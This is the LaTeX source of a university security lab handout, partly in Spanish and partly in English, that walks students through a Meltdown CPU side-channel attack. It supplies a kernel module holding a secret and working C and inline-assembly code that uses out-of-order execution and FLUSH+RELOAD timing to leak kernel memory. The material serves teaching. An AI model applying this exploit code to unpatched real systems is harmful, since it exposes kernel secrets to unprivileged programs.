%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\input{\commonfolder/header}
\input{\commonfolder/copyright}



\lhead{\bfseries SEED Labs -- Laboratorio del Ataque Meltdown }
\newcommand{\meltdownFigs}{./Figs}


\begin{document}

\begin{center}
{\LARGE Laboratorio del Ataque Meltdown}
\end{center}

\seedlabcopyright{2018}


% *******************************************
% SECTION
% ******************************************* 
\section{Introducción}

Descubierta en el 2017 y publicada en Enero del 2018, los fallas que explotan la vulnerabilidad Meltdown se abusan de un fallo crítico que existen en muchos procesadores modernos, incluyendo procesadores Intel y ARM \cite{Lipp2018meltdown}. 
Estas vulnerabbilidades permiten que un programa que corre con privilegios de usuario lean datos guardados dentro de la memoria del kernel. Este tipo de acceso no es permitido por las protecciones de hardware en la mayoría de los CPUs, pero existe una vulnerabilidad en el diseño de estos procesadores que permiten evadir esta protección. Dado que esta vulnerabilidad existe a nivel de hardware, es muy difícil resolver el problema de raíz, al menos que se cambie el procesador de la PC. La vulnerabilidad Meltdown representa un tipo especial de falla en el diseño de los CPUs, junto con la vulnerabilidad Spectre, nos proveen una invaluable lección para la educación de la seguridad.

\underline{Objetivos del Aprendizaje} El objetivo de este laboratorio es que los estudiantes puedan aprender y logren experiencia en el Ataque Meltdown. El ataque por sí mismo es algo sofisticado, es por eso que para una mejor compresión del mismo y de como atacarlo, lo hemos fragmentado en pequeños pasos. Una vez que los estudiantes entiendan cada uno de los pasos, no debería de resultarles difícil reunir todos los elementos y proceder a realizar el ataque. Los estudiantes usarán el Ataque Meltdown para mostrar en pantalla/obtener e imprimir un dato secreto guardado dentro del kernel. 

Este laboratorio cubre los siguientes tópicos:

\begin{itemize}[noitemsep]
\item Ataque Meltdown 
\item Ataque Side channel 
\item CPU Caching
\item Ejecución fuera de orden dentro de la microarquitectura del CPU
\item Protección de memoria en el kernel a nivel Sistema Operativo
\item Módulos del Kernel
\end{itemize} 


\paragraph{Lecturas y Videos.}
Para una cobertura más detallada sobre el ataque Meltdown puede consultar:

\begin{itemize}
\item Capítulo 13 del libro de SEED, \seedbook
\item Sección 8 del curso de SEED en Udemy, \seedcsvideo
\end{itemize}



\paragraph{Entorno de Labooratorio.} \seedenvironment Dentro de la Máquina Virtual de SEED que corre Ubuntu 20.04, las tareas de la 1 a la 6 funcionarán como se espera, pero las tareas 7 y 8 no loo harán debido a la protección implementada en el sistema operativo.

Al usar este laboratorio, los instructores deberán tener en cuenta lo siguiente:
Primero, la vulnerabilidad de Meltdown es una falla dentro de los CPUs Intel, por lo que sí la máquina de un estudiante se encuentra corriendo un procesador AMD el ataque no funcionará. 
Segundo Intel está trabajando para solucionar este problema en sus CPUs, por lo que si la máquina de un esttudiante usa un procesador nuevo de Intel el ataque puede no funcionar. Esto no es un problema por ahora (Febrero 2018), pero de acá aa 6 meses es posible que la situación cambie.
Tercero, aunque la mayoría de los estudiantes tengan máquinas parcheadas, el ataque es realizado dentro de nuestras Máquinas Virtuales las cuales no lo están, por lo que el ataque será efectivo.
Los estudiantes no deben de actualizar el sistema operativo de sus Máquinas Virtuales debido a que las actualizaciones puedan llegar a parchear esta vulnerabilidad y el ataque ya no será exitoso.


\paragraph{Agradecimientos} Este laboratorio ha sido desarrollado con la ayuda de 
Hao Zhang y Kuber Kohli, estos estudiantes son estudiantes graduado en el Departamento de Ingeniería Electrónica y Ciencias de la Computación de la Universidad de Syracuse.



% *******************************************
% SECTION
% *******************************************
%\section{Lab Environment Setup}
%\section{Tasks 1-2: Side Channel Attacks}

\newcommand{\sideChannelFigs}{./Figs}
\input{Side_Channel_Attack.tex}




% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 3-5: Preparación para el Ataque Meltdown}

La isolación de memoria es uno de los fundamentos principales la seguridad de los sistemas. En la mayoría de los sistemas operativos, la memoria del kernel no se puede acceder directamente desde programas que son ejecutados en el espacio de usuario. Esta isolación se logra por medio de un bit (supervisor bit) en el proesador que define cuando una página de memoria del kernel puede ser o no accedida. Este bit es seteado cuando la CPU entra en el espacio del kernel y se borra cuando este salta al espacio de usuario (\cite{wiki:protectionring}).
A través de este mecanismo el kernel puede asignar de manera segura el espacio de direcciones a cada uno de los procesos, por lo que la tabla de páginas no necesita cambiar cuando un programa del espacio de usuario cambia al espacio del kernel.
Sin embargo, este mecanismo se ve vulnerado con el ataque Meltdown, que permite que programas no privilegiados del espacio del usuario pueda lear de forma arbitraria memoria del espacio de direcciones del kernel.

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 3: Guardando data sensible en el Espacio del Kernel}

Para simplificar nuestra tarea, hemos guardado un dato secreto en el espacio del kernel y mostramos como un programa corriendo en el espacio de usuario puede encontrar cual es ese dato secreto. Hemos usado un módulo kernel para guardar este dato secreto. La implementación de este módulo se encuentra en el archivo \texttt{MeltdownKernel.c}. 
La tarea de loos estudiantes será compilar y instalar este módulo. El código es mostrado a continuación.

\begin{lstlisting}[caption=\texttt{MeltdownKernel.c}, label=meltdown:list:kernelmodule]
static char secret[8] = {'S', 'E', 'E', 'D', 'L', 'a', 'b', 's'};
static struct proc_dir_entry *secret_entry;
static char* secret_buffer;

static int test_proc_open(struct inode *inode, struct file *file)
{
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4,0,0)
   return single_open(file, NULL, PDE(inode)->data);
#else
   return single_open(file, NULL, PDE_DATA(inode));
#endif
}

static ssize_t read_proc(struct file *filp, char *buffer, 
                         size_t length, loff_t *offset)
{
   memcpy(secret_buffer, &secret, 8);                  (*@\ding{192}@*)
   return 8;
}

static const struct file_operations test_proc_fops =
{
   .owner = THIS_MODULE,
   .open = test_proc_open,
   .read = read_proc,
   .llseek = seq_lseek,
   .release = single_release,
};

static __init int test_proc_init(void)
{
   // write message in kernel message buffer
   printk("secret data address:%p\n", &secret);        (*@\ding{193}@*)

   secret_buffer = (char*)vmalloc(8);

   // create data entry in /proc
   secret_entry = proc_create_data("secret_data", 
                  0444, NULL, &test_proc_fops, NULL);  (*@\ding{194}@*)
   if (secret_entry) return 0;

   return -ENOMEM;
}


static __exit void test_proc_cleanup(void)
{
   remove_proc_entry("secret_data", NULL);
}

module_init(test_proc_init);
module_exit(test_proc_cleanup);
\end{lstlisting}

Existen dos cuestiones importantes a tener en cuenta o los ataques Meltdown serán difíciles de lograr. En nuestro módulo kernel, debemos de asegurarnos que se cumplan las siguientes condiciones:

\begin{itemize}
\item Necesitamoos saber la dirección del dato secreto. El módulo guarda la dirección de este dato en el buffer de mensajes del kernel (Línea \ding{193}), que es accesible de forma pública; de ahí obtendremos la dirección. En los escenarios reales de un ataque Meltdown, los atacantes deben de descubrir la forma de obtener la dirección o adivinarla de alguna forma.

\item El dato secreto necesita estar cacheado or la taza de probabilidad de que el ataque sea exitoso será baja.  La razón de esto será explicada después. Para lograr esto, necesitamos usar el dato secreto solamente una vez. Hemos creado una entrada de datos en \texttt{/proc/secret\_data}~(Línea \ding{194}), la cual provee una ventana para programas que corren en el espacio de usuario y que permite interactuar con el móduloo del kernel. Cuando el programa en el espacio del usuario lee de esta entrada, la función \texttt{read\_proc()} será invocada en el módulo del kernel, dentro de la cual el dato secreto será cargado (Línea \ding{192}) y así será almacenada en la cache del CPU.
Cabe señalar que la función \texttt{read\_proc()} no devuelve el dato secreto al espacio de usuario, para que este no se filtre, por lo que necesitamos usar el ataque Meltdown para obtener este dato secreto.
\end{itemize}


\paragraph{Compilación y ejecución.}
Descargue el código del sitio oficial del laboratorio y entre al directorio que contiene el \textit{Makefile} y \textit{MeltdownKernel.c}. Escriba el comando \texttt{make} para compilar el módulo del kernel.
Para instalar este módulo, usaremos el comando  \texttt{insmod}. Una vez que hemos instalado el módulo de forma correcta, podemos usar el comando \texttt{dmesg} para obtener la dirección del dato secreto en el buffer de mensajes del kernel. Anote esta dirección ya que será usada más adelante.

\begin{lstlisting}
 $ make
 $ sudo insmod MeltdownKernel.ko
 $ dmesg | grep 'secret data address'
 secret data address: 0xfb61b000
\end{lstlisting}
 



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 4: Accediendo a la Memoria del Kernel desde el Espacio de Usuario}

Ahora que conocemos la dirección del dato secreto, procederemos a hacer un experimento y observar si podemos acceder o no a la dirección antes anotada y obtener el dato secreto.
Puede escribir su propio código para este experimento. Hemos hecho un código de ejemplo que se muestra a continuación. Debe de reemplazar la dirección en la Línea \ding{192}, con la que anotó en la Tarea anterior.
Compile y ejecute este programa (o su propio código) y describa su observación.
¿Será exitosa la ejecución de la Línea \ding{193}? ¿Puede ejecutar el programa la Línea \ding{193}?


\begin{lstlisting}
int main()
{
  char *kernel_data_addr = (char*)0xfb61b000;  (*@\ding{192}@*)
  char kernel_data = *kernel_data_addr;        (*@\ding{193}@*)
  printf("I have reached here.\n");            (*@\ding{194}@*)
  return 0;
}
\end{lstlisting}



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 5: Manejar Errores/Excepciones en C}


From Task 4, you have probably learned that accessing a kernel memory from the user space will
cause the program to crash. In the Meltdown attack, we need to do something 
after accessing the kernel memory, so we cannot let the program crash. 
Accessing prohibited memory location will raise a SIGSEGV signal; if a program does not 
handle this exception by itself, the operating system will handle it and terminate the 
program. That is why the program crashes. There are several ways to prevent
programs from crashing by a catastrophic event. 
%With Intel TSX technology,
%exceptions can be suppressed in the first place by making several instruction
%statements atomic. Due to the lack of support of TSX in VirtualBox, even if your CPU has TSX
%feature enabled, our VM cannot benefit from it. Thus, we will not use this technique.
One way is to define our own signal handler in the program to capture
the exceptions raised by catastrophic events. 


Unlike C++ or other high-level languages, C does not provide direct support
for error handling~(also 
known as exception handling), such as the try/catch clause. 
However, we can emulate the try/catch clause using \texttt{sigsetjmp()} and \texttt{siglongjmp()}.
We provide a C program called \texttt{ExceptionHandling.c} in the following 
to demonstrate how
a program can continue to execute even if there is a critical exception, such as memory access
violation. Please run this code, and describe your observations. 


\begin{lstlisting}[caption=\texttt{ExceptionHandling.c}]
static sigjmp_buf jbuf;

static void catch_segv()
{
  // Roll back to the checkpoint set by sigsetjmp().
  siglongjmp(jbuf, 1);                             (*@\ding{192}@*)
}

int main()
{ 
  // The address of our secret data
  unsigned long kernel_data_addr = 0xfb61b000;

  // Register a signal handler
  signal(SIGSEGV, catch_segv);                     (*@\ding{193}@*)

  if (sigsetjmp(jbuf, 1) == 0) {                   (*@\ding{194}@*)
     // A SIGSEGV signal will be raised. 
     char kernel_data = *(char*)kernel_data_addr;  (*@\ding{195}@*)

     // The following statement will not be executed.
     printf("Kernel data at address %lu is: %c\n", 
                    kernel_data_addr, kernel_data);
  }
  else {
     printf("Memory access violation!\n");
  }

  printf("Program continues to execute.\n");
  return 0;
}
\end{lstlisting}



The exception handling mechanism in the above code is quite complicated, so we provide further
explanation in the following:

\begin{itemize}

\item Set up a signal handler: we register a \texttt{SIGSEGV} signal handler in Line \ding{193}, so when
a \texttt{SIGSEGV} signal is raised, the handler function \texttt{catch\_segv()} will be invoked. 

\item Set up a checkpoint: after the signal handler has finished processing the exception, it
needs to let the program continue its execution from particular checkpoint. 
Therefore, we need to define a checkpoint first. This is achieved via
\texttt{sigsetjmp()} in Line \ding{194}: 
\texttt{sigsetjmp(jbuf, 1)} saves the stack context/environment in \texttt{jbuf} 
for later use by \texttt{siglongjmp()};  it returns 0 when the 
checkpoint is set up~\cite{sigsetjmp}. 


\item Roll back to a checkpoint: When \texttt{siglongjmp(jbuf, 1)} is called, the
state saved in the \texttt{jbuf} variable is copied back in the processor and computation starts over
from the return point of the \texttt{sigsetjmp()} function, 
but the returned value of the \texttt{sigsetjmp()} function  
is the second argument of the \texttt{siglongjmp()} function, which is \texttt{1} in our case.
Therefore, after the exception handling, the program continues its execution from the
\texttt{else} branch.  

\item Triggering the exception: The code at Line \ding{195} will 
trigger a \texttt{SIGSEGV} signal due to the memory access violation (user-level programs
cannot access kernel memory).

\end{itemize}



%\item \textbf{Line \ding{194}}: \texttt{sigsetjmp()} returns 0 if returning directly, and non-zero when
%returning from \texttt{siglongjmp()} using the saved context. If the second argument of 
%\texttt{sigsetjmp()} is
%non-zero, the process's current signal mask is saved in \texttt{jbuf} and will be restored if a
%\texttt{siglongjmp()} is later performed with this \texttt{jbuf}. Therefore, when 
%\texttt{sigsetjmp()} is invoked the first time,
%it returns 0 and fills the \texttt{jbuf} structure with the calling environment and signal mask. The
%calling environment represents the state of registers and the point in the code where the
%function was called. In this case, \texttt{SIGSEGV} is captured and 
%\texttt{siglongjmp()} is called, the program
%will roll back to here, with \texttt{ sigsetjmp()}’s return value be 1.
%

%The execution sequence for our program is the following:

%\begin{enumerate}
%\item Set up the \texttt{SIGSEGV} handler (Line \ding{193}).

%\item \texttt{sigsetjmp()} is invoked for the first time; its return value is 0 (Line
%\ding{194}).
%
%\item Access the kernel memory, and a \texttt{SIGSEGV} signal is raised (Line \ding{195}).
%
%\item \texttt{catch\_segv()} is called. \texttt{siglongjmp()} is called and reset the calling
%environment from \texttt{jbuf}. It also sets the return value of
%\texttt{sigsetjmp()} to 1 (Line \ding{192}).
%
%\item Program jumps to Line \ding{194}. This time the if statement is not evaluated to be true.
%
%\item The else branch is executed.
%\end{enumerate}







% *******************************************
% SECTION
% *******************************************
\section{Tarea 6: Ejecución Fuera de Orden en el CPU}


From the previous tasks, we know that if a program tries to read 
kernel memory, the access will fail and an exception will be raised. 
Using the following code as an example, we know that 
Line 3 will raise an exception because the memory at address \texttt{0xfb61b000}
belongs to the kernel. Therefore, the execution will be interrupted at Line 3, and 
Line 4 will never be executed, so the value of 
the \texttt{number} variable will still be 0.

\begin{lstlisting}
1  number = 0;
2  *kernel_address = (char*)0xfb61b000;
3  kernel_data = *kernel_address;
4  number = number + kernel_data;
\end{lstlisting}

The above statement about the code example is true when looking from outside of the CPU. 
However, it is not completely true if we get into the CPU, and look at the execution sequence
at the microarchitectural level. If we do that, we will find out that 
Line 3 will successfully get the kernel data, and Line 4 and subsequent instructions 
will be executed. This is due to an important optimization technique adopted by
modern CPUs. It is called out-of-order execution. 


Instead of executing the instructions strictly in their original order, modern high performance
CPUs allow out-of-order execution to exhaust all of the execution units. Executing instructions
one after another may lead to poor performance and inefficient resources usage, i.e., current
instruction is waiting for previous instruction to complete even though some execution units
are idle~\cite{wiki:outoforder}. With the out-of-order execution feature, CPU can 
run ahead once the required resources are available.


In the code example above, at the microarchitectural level, Line 3 involves two 
operations: load the data (usually into a register), and
check whether the data access is allowed or not. If the data is already in
the CPU cache, the first operation will be quite fast, while the second operation may take a
while. To avoid waiting, the CPU will continue executing Line 4 and subsequent instructions,
while conducting the access check in parallel. This is out-of-order execution. The results of
the execution will not be committed before the access check finishes. In our case,
the check fails, so all the results caused by the out-of-order execution will be discarded like
it has never happened.  That is why from outside we do not see that Line 4 was executed.  
Figure~\ref{meltdown:fig:outoforder} illustrates the out-of-order execution 
caused by Line 3 of the sample code. 



\begin{figure}[htb]
\centering
\includegraphics[width=0.75\textwidth]{\meltdownFigs/meltdown.pdf}
\caption{Out-of-order execution inside CPU}
\label{meltdown:fig:outoforder}
\end{figure}


Intel and several CPU makers made a severe mistake in the design of the out-of-order execution. 
They wipe out the effects of the out-of-order execution on registers and memory
if such an execution is not supposed to happen, so the execution does not lead to 
any visible effect. However, they forgot one thing, the effect on CPU caches.  
During the out-of-order execution, the referenced memory is fetched into a register and is 
also stored in the cache. If the out-of-order execution has to be discarded, 
the cache caused by such an execution should also be discarded. Unfortunately, this is 
not the case in most CPUs. Therefore, it creates an observable effect. 
Using the side-channel technique described in Tasks 1 and 2, we 
can observe such an effect. The Meltdown attack cleverly uses this 
observable effect to find out secret values 
inside the kernel memory. 


In this task, we use an experiment to observe the effect caused by 
an out-of-order execution. The code for this experiment is shown below. 
In the code, Line \ding{192} will cause an exception, so Line \ding{193} will
not be executed. However, due to the out-of-order execution, Line \ding{193} is 
executed by the 
CPU, but the result will eventually be discarded. However, because of the execution,
\texttt{array[7 * 4096 + DELTA]} will now be cached by CPU. We use the side-channel code 
implemented in Tasks 1 and 2 to check whether we can observe the effect. 
Please download the code from the lab website, run it and describe your observations. 
In particular, please provide an evidence to show that Line \ding{193} is 
actually executed. 


\begin{lstlisting}[caption=\texttt{MeltdownExperiment.c}, label=meltdown:list:outoforder]
void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;

  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;     (*@\ding{192}@*)
  array[7 * 4096 + DELTA] += 1;               (*@\ding{193}@*)
}


// Signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main()
{
  // Register a signal handler
  signal(SIGSEGV, catch_segv);

  // FLUSH the probing array
  flushSideChannel();

  if (sigsetjmp(jbuf, 1) == 0) {
      meltdown(0xfb61b000);                   (*@\ding{194}@*)
  }
  else {
      printf("Memory access violation!\n");
  }

  // RELOAD the probing array
  reloadSideChannel();                     
  return 0;
}
\end{lstlisting}


It should be noted that the address in Line \ding{194} should be replaced by
the actual address that you found from the kernel module. Compile and 
run the code (see Section~\ref{sidechannel:sec:compilation} for the instructions
on the compilation). Document and explain your observations. 
%What \texttt{"taskset 0x1"} does is basically pinning this program to only
%one logical core to reduce cache miss, because L1 cache is proprietary to each core and we
%do not want our program to be cached in a different L1 cache.

%\begin{lstlisting}
% $ gcc -march=native MeltdownExperiment.c
%\end{lstlisting}



% *******************************************
% SECTION
% ******************************************* 
\section{Task 7: The Basic Meltdown Attack}


The out-of-order execution creates an opportunity for us to read data from 
the kernel memory, and then use the data to conduct operations that can cause
observable effects on the CPU cache. How far a CPU can go in 
the out-of-order execution depends on
how slow the access check, which is done in parallel, is performed. 
This is a typical race condition situation. In this task, we will exploit this race condition
to steal a secret from the kernel. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 7.1: A Naive Approach}

In the previous task, we can get \texttt{array[7 * 4096 + DELTA]} into the CPU cache.
Although we can observe that effect, we do not get any useful information about 
the secret. If instead of using \texttt{array[7 * 4096 + DELTA]}, we 
access \texttt{array[kernel\_data * 4096 + DELTA]}, which brings it
into the CPU cache. 
Using the FLUSH+RELOAD technique, we check the access time of
\texttt{array[i*4096 + DELTA]} for \texttt{i = 0, $\ldots$, 255}. 
If we find out that only
\texttt{array[k*4096 + DELTA]} is in the cache, we can infer that 
the value of the \texttt{kernel\_data} is \texttt{k}.  
Please try this approach by modifying \texttt{MeltdownExperiment.c} shown in
Listing~\ref{meltdown:list:outoforder}. Please describe your observations.
Even if your attack is not successful, you should note down your observation, and continue on
to Task 7.2, which is intended to improve the attack. 


%Meltdown exploits a race condition, which occurs between memory access and permission checking
%during instruction processing, as you can see in Figure 4.
%To successfully launch the meltdown attack, the following steps will be taken:

%\begin{enumerate}
%\item User program tries to access the secret data in kernel memory by its address.
%
%\item CPU will load secret data into register while waiting for security check.
%
%\item Program continues to execute because of the out-of-order execution, but the results will
%never be committed because an exception will be raised in previous instruction.
%
%\item During out-of-order execution, the program brings the secret data into cache.
%
%\item CPU is done with the security check. Since we access a prohibited memory location, an exception is raised.
%
%\item The exception should be handled properly to prevent the program from crashing.
%
%\item All the memory and register contents during out-of-order execution won’t be committed.
%But the cache content is not evicted.
%
%\item Cache side-channel attack (Flush+Reload) can be leveraged to steal the secret data from the cache.
%\end{enumerate}




% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 7.2: Improve the Attack by Getting the Secret Data Cached}


Meltdown is a race condition vulnerability, which involves the racing between the out-of-order
execution and the access check. The faster the out-of-order execution is, the more instructions we 
can execute, and the more likely we can create an observable effect that can help us get the
secret. Let us look see how we can make the out-of-order execution faster. 

The first step of the out-of-order execution in our code involves loading the kernel data into 
a register. At the same time, the security check on such an access is performed.  
If the data loading is slower than security check, i.e., when the security check is done, 
the kernel data is still on its way from the memory to the register, the out-of-order execution
will be immediately interrupted and discarded, because the access check fails. Our attack will fail
as well. 

If the kernel data is already in the CPU cache, loading the kernel data into a 
register will be much faster, and we may be able to get to our critical 
instruction, the one that loads the array, before the failed check 
aborts our out-of-order execution. In practice, if a kernel data item is not cached, using 
Meltdown to steal the  data will be difficult. However, as it has been 
demonstrated, Meltdown attacks can still be successful, but  
they require high-performance CPU and DRAM~\cite{meltdowdemo}. 


In this lab, we will get the kernel secret data cached before launching the attack. 
In the kernel module shown in Listing~\ref{meltdown:list:kernelmodule}, we let user-level
program to invoke a function inside the kernel module. This function will access the secret
data without leaking it to the user-level program. The side effect of this access is that the
secret data is now in the CPU cache. We can add the  
code to our attack program used in Task 7.1, before triggering the out-of-order execution.
Please run your modified attack program and see whether your success rate is improved or not.


\begin{lstlisting}
// Open the /proc/secret_data virtual file.
int fd = open("/proc/secret_data", O_RDONLY);
if (fd < 0) {
    perror("open");
    return -1;
}

int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
\end{lstlisting}



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 7.3: Using Assembly Code to Trigger Meltdown}

You probably still cannot succeed in the previous task, even with secret data being 
cached by CPU. Let us do one more improvement by adding a few lines of
assembly instructions before the kernel memory access. See the code in
\texttt{meltdown\_asm()} below.  The code 
basically do a loop for 400 times (see Line \ding{192}); inside the loop,
it simply add a number \texttt{0x141} to the \texttt{eax} register.  
This code basically does useless computations, but 
according to a post discussion, these extra lines of code
``give the algorithmic units something to chew while
memory access is being speculated''~\cite{boldin}. 
This is an important trick to increase the possibility of success. 
%The reason why this code is written in assembly is that the code only
%accesses registers not memory. 


\begin{lstlisting}[caption=\texttt{meltdown\_asm()}, label=meltdown:list:meltdown_asm]
void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // Give eax register something to do
   asm volatile(
       ".rept 400;"                  (*@\ding{192}@*)
       "add $0x141, %%eax;"
       ".endr;"                      (*@\ding{193}@*)
    
       :
       :
       : "eax"
   ); 
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;              
}
\end{lstlisting}


Please call the \texttt{meltdown\_asm()} function, 
instead of the original \texttt{meltdown()} 
function. Describe your observations. Increase and decrease the number of
loops, and report your results. 




% *******************************************
% SECTION
% ******************************************* 
\section{Task 8: Make the Attack More Practical}

Even with the optimization in the previous task, we may still not be able 
get the secret data every time: sometimes, our attack produces the correct 
secret value, but sometimes, our attack fails to 
identify any value or identifies a wrong value. 
To improve the accuracy, we can use a statistical technique.
The idea is create a score array of size 256, one element for each possible 
secret value. We then run our attack for multiple times. Each time, if our
attack program says that \texttt{k} is the secret (this result may be
false), we add 1 to \texttt{scores[k]}.  After running the attack for many
times, we use the value \texttt{k} with 
the highest score as our final estimation of the secret.  This will produce
a much reliable estimation than the one based on a single run. The revised
code is shown in the following.




\begin{lstlisting}[caption=\texttt{MeltdownAttack.c}]
static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
     addr = &array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; /* if cache hit, add 1 for this value */
  }
}

// Signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main()
{
  int i, j, ret = 0;
  
  // Register signal handler
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }

  memset(scores, 0, sizeof(scores));
  flushSideChannel();
  
  // Retry 1000 times on the same address.
  for (i = 0; i < 1000; i++) {
    ret = pread(fd, NULL, 0, 0);
    if (ret < 0) {
      perror("pread");
      break;
    }
	
    // Flush the probing array
    for (j = 0; j < 256; j++) 
        _mm_clflush(&array[j * 4096 + DELTA]);

    if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }

    reloadSideChannelImproved();
  }

  // Find the index with the highest score.
  int max = 0;
  for (i = 0; i < 256; i++) {
    if (scores[max] < scores[i]) max = i;
  }

  printf("The secret value is %d %c\n", max, max);
  printf("The number of hits is %d\n", scores[max]);

  return 0;
}
\end{lstlisting}


Please compile and run the code, and explain your observations. 
The code above only steals a one-byte secret from the kernel. The actual
secret placed in the kernel module has 8 bytes. You need to modify the above code
to get all the 8 bytes of the secret.


% *******************************************
% SECTION
% *******************************************
\section{Informe del Laboratorio}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/submission}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% *******************************************
% SECTION
% *******************************************
\section*{Agradecimientos}

\input{\commonfolder/acknowledgments}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\bibliographystyle{plain}
\def\baselinestretch{1}
\bibliography{BibMeltdownSpectre}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\end{document}


